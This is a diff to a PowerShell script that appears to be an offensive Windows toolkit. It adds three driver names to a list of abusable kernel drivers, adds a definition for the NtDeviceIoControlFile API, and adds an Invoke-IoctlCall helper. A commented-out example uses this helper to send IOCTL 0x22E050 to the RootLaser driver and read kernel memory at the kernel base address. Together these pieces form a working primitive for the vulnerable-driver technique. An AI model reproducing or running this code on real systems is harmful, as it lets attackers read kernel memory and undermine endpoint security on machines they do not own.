@@ -67,7 +67,8 @@ using namespace System.Windows.Forms
             "EBIoDispatch", "CcProtect", "EnPortv", "xkpsm", "pcdsrvc_x64",
             "AsrDrv107", "Pmxdrv", "pmxdrv64", "MyPortIO_x64", "MyPortIO0",
             "athpexnt", "MonProcessEX", "ktapi", "shdrv_x64", "shdrv",
-            "signed", "WinNotify", "DCRCVDrv", "DCRCVDRV_U", "PSKD64"
+            "signed", "WinNotify", "DCRCVDrv", "DCRCVDRV_U", "PSKD64",
+            "RootLaser", "ZyArk", "ZYArKit"
 
  $Binary | % {
     $DriverPath = Join-Path -Path $SourceDir -ChildPath "$_.sys"
@@ -1638,6 +1639,23 @@ if (-not $NtApi) {
                 [Int32],    # nOutBufferSize
                 [IntPtr]    # lpBytesReturned
                 [IntPtr]    # lpOverlapped
+            )
+        },
+        @{
+            Dll        = 'ntdll.dll'
+            Name       = 'NtDeviceIoControlFile'
+            ReturnType = [Int32] # or NTSTATUS
+            Parameters = @(
+                [IntPtr],   # FileHandle
+                [IntPtr],   # Event
+                [IntPtr],   # ApcRoutine
+                [IntPtr],   # ApcContext
+                [IntPtr],   # IoStatusBlock
+                [Int32],    # IoControlCode
+                [IntPtr],   # InputBuffer
+                [Int32],    # InputBufferLength
+                [IntPtr],   # OutputBuffer
+                [Int32]     # OutputBufferLength
             )
         },
         @{
@@ -4580,6 +4598,87 @@ Function Get-FileHandle {
         return $FileHandle
     }
     return [IntPtr]::Zero
+}
+Function Invoke-IoctlCall {
+    param(
+        [Int32]$Mode = 0,       # 0,1
+        [IntPtr]$FileHandle,    # Pass Driver handle
+        [Int32]$IoCtrlCode,     # Pass IOCTL code as a variable
+        [IntPtr]$InOutPtr,      # Pass $inOutPtr as a variable
+        [Int32]$InputSize = 0,  # Pass input size as a variable
+        [Int32]$OutputSize = 0  # Pass output size as a variable
+    )
+
+    <#
+    try {
+        $Handle = Get-FileHandle -FileName RootLaser
+        $targetAddr = Get-KernelBaseAddress
+        $readSize   = 64
+        $inOutPtr   = New-IntPtr -Size $readSize -TypeSize ([UInt64], [UInt32], [UInt32]) -Values ($targetAddr, $readSize, 0)
+        Invoke-IoctlCall -Mode 0 -FileHandle $Handle -IoCtrlCode 0x22E050 -InOutPtr $inOutPtr -InputSize 16 -OutputSize 64 | Out-Null
+        Format-HexView -Address $inOutPtr -Size 64 -Mode 16x
+        Free-IntPtr $inOutPtr -Method Auto
+    }
+    finally {
+        Free-IntPtr $Handle -Method NtHandle
+    }
+    #>
+
+    $IoStatus = New-IntPtr -Size 16
+
+    try {
+        if ($Mode -eq 0) {
+            
+            $values = @(
+                $FileHandle
+                $IoCtrlCode
+                $InOutPtr
+                $InputSize
+                $InOutPtr
+                $OutputSize
+                @($IoStatus, 0L)
+            )
+            
+            $hr = $NtApi::DeviceIoControl.Invoke($values)
+            $bytesReturned = [Marshal]::ReadInt32($IoStatus, 0)
+            $statusVal = [Int32](![bool]$hr)
+            return [PSCustomObject][Ordered]@{
+                Success   = [bool]$hr
+                NTSTATUS  = "0x$($statusVal.ToString('X8'))"
+                BytesRet  = $bytesReturned
+            }
+        
+        } else {
+
+            $values = @(
+                $FileHandle
+                @(0,0,0)
+                $IoStatus
+                $IoCtrlCode
+                $InOutPtr
+                $InputSize
+                $InOutPtr
+                $OutputSize
+            )
+            $NTSTATUS =  $NtApi::NtDeviceIoControlFile.Invoke($values)
+
+            if ($NTSTATUS -eq 259) {
+                $waitValues = $FileHandle, $false, [IntPtr]::Zero
+                Invoke-UnmanagedMethod -Dll ntdll.dll -Function NtWaitForSingleObject -Values $waitValues -SysCall | Out-Null
+                $NTSTATUS = [Marshal]::ReadInt64($IoStatus, 0)
+            }
+
+            $bytesReturned = [Marshal]::ReadInt64($IoStatus, 8)
+            return [PSCustomObject][Ordered]@{
+                Success   = ($NTSTATUS -ge 0)
+                NTSTATUS  = "0x$($NTSTATUS.ToString('X8'))"
+                BytesRet  = $bytesReturned
+            }
+        }
+    }
+    finally {
+        Free-IntPtr $IoStatus -Method Auto
+    }
 }
 Function Get-KernelBaseAddress {
     [CmdletBinding()]
